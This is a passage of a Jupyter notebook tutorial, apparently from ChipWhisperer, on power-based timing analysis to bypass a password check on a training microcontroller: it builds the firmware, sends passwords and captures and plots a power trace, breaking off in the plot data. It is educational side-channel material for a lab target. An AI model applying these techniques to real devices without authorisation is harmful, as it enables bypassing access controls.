
Timing Analysis with Power for Password Bypass
==============================================

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'
    CRYPTO_TARGET = 'NONE'

Firmware
--------

Like before, we'll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWLITEARM.hex
    rm -f -- basic-passwdcheck-CWLITEARM.eep
    rm -f -- basic-passwdcheck-CWLITEARM.cof
    rm -f -- basic-passwdcheck-CWLITEARM.elf
    rm -f -- basic-passwdcheck-CWLITEARM.map
    rm -f -- basic-passwdcheck-CWLITEARM.sym
    rm -f -- basic-passwdcheck-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s
    rm -f -- basic-passwdcheck.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d
    rm -f -- basic-passwdcheck.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: basic-passwdcheck-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWLITEARM.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output basic-passwdcheck-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=basic-passwdcheck-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWLITEARM.elf basic-passwdcheck-CWLITEARM.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWLITEARM.elf basic-passwdcheck-CWLITEARM.eep || exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z basic-passwdcheck-CWLITEARM.elf > basic-passwdcheck-CWLITEARM.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWLITEARM.sym
    arm-none-eabi-nm -n basic-passwdcheck-CWLITEARM.elf > basic-passwdcheck-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       5232	    108	   1188	   6528	   1980	basic-passwdcheck-CWLITEARM.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm (STM32F3)
    +--------------------------------------------------------





.. parsed-literal::

    .././simpleserial/simpleserial.c: In function 'simpleserial_get':
    .././simpleserial/simpleserial.c:131:10: warning: variable 'ret' set but not used [-Wunused-but-set-variable]
      uint8_t ret[1];
              ^~~



Setup
-----

Setup is the same as usual, except this time we'll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 5339 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 5339 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we'll need to reset it.

We'll be doing this a lot, so we'll define a function that resets the
target (this function is also available by running
"Helper\_Scripts/Setup.ipynb" as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn't an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decrypti
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see "Access granted, Welcome!":


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this 'sacrificial' device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we'll
arm the scope just before we send our password attempt, then record the
trace as we've done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decrypti
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    Access granted, Welcome!
    
    


Now that we have a trace, we'll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="bb490cda-cf91-4911-8350-5498ec2b0522"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#bb490cda-cf91-4911-8350-5498ec2b0522');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) {
            if (callback != null)
              callback();
          });
        } finally {
          delete root._bokeh_onload_callbacks
        }
        console.debug("Bokeh: all callbacks have finished");
      }
    
      function load_libs(css_urls, js_urls, callback) {
        if (css_urls == null) css_urls = [];
        if (js_urls == null) js_urls = [];
    
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = css_urls.length + js_urls.length;
    
        function on_load() {
          root._bokeh_is_loading--;
          if (root._bokeh_is_loading === 0) {
            console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
            run_callbacks()
          }
        }
    
        function on_error() {
          console.error("failed to load " + url);
        }
    
        for (var i = 0; i < css_urls.length; i++) {
          var url = css_urls[i];
          const element = document.createElement("link");
          element.onload = on_load;
          element.onerror = on_error;
          element.rel = "stylesheet";
          element.type = "text/css";
          element.href = url;
          console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
          document.body.appendChild(element);
        }
    
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var element = document.createElement('script');
          element.onload = on_load;
          element.onerror = on_error;
          element.async = false;
          element.src = url;
          console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
          document.head.appendChild(element);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.error("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      function inject_raw_css(css) {
        const element = document.createElement("style");
        element.appendChild(document.createTextNode(css));
        document.body.appendChild(element);
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.2.0.min.js"];
      var css_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.css"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {} // ensure no trailing comma for IE
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(css_urls, js_urls, function() {
          console.debug("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="05a29790-ce79-44df-80d1-faf5032cc7c9" data-root-id="1002"></div>
    
    </div>



.. raw:: html

    

    <div id="18d4752b-b27d-4e9b-8c65-ce4909b8b520"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#18d4752b-b27d-4e9b-8c65-ce4909b8b520');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"c8895b25-1359-4ed5-ab59-a4ed37ac09d4":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"center":[{"id":"1015","type":"Grid"},{"id":"1020","type":"Grid"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1037","type":"GlyphRenderer"}],"title":{"id":"1040","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1044","type":"BasicTickFormatter"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1045","type":"BoxAnnotation"},{"attributes":{},"id":"1042","type":"BasicTickFormatter"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1035","type":"Line"},{"attributes":{},"id":"1047","type":"UnionRenderers"},{"attributes":{},"id":"1007","type":"LinearScale"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"formatter":{"id":"1044","type":"BasicTickFormatter"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{"dimension":1,"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"formatter":{"id":"1042","type":"BasicTickFormatter"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{},"id":"1046","type":"Selection"},{"attributes":{"source":{"id":"1034","type":"ColumnDataSource"}},"id":"1038","type":"CDSView"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"overlay":{"id":"1045","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{},"id":"1024","type":"SaveTool"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,8